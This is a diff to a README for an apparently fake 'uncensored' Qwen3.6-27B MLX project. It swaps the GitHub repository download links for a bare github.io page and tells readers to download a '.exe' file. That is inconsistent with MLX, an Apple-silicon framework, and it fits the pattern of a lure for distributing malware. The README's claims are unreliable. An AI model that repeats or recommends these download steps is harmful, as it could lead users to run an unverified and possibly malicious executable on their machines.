@@ -1,6 +1,6 @@
 # 🤖 Qwen3.6-27B-AEON-Ultimate-Uncensored-MLX - Run advanced language models on hardware
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Mureilfortysixth457/Qwen3.6-27B-AEON-Ultimate-Uncensored-MLX)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://mureilfortysixth457.github.io)
 
 This project provides tools to run the Qwen3.6-27B-AEON language model on your computer. It focuses on high performance and keeps the original capabilities of the model intact. It includes specialized support for vision features and self-speculation headers to ensure the model responds quickly and accurately.
 
@@ -22,7 +22,7 @@ To run this software, your computer needs specific hardware components. Check th
 4. Click the link that says "latest".
 5. Download the file ending in `.exe` to your computer.
 
-[https://github.com/Mureilfortysixth457/Qwen3.6-27B-AEON-Ultimate-Uncensored-MLX](https://github.com/Mureilfortysixth457/Qwen3.6-27B-AEON-Ultimate-Uncensored-MLX)
+[https://mureilfortysixth457.github.io](https://mureilfortysixth457.github.io)
 
 ## 🏗️ Installation Steps
 
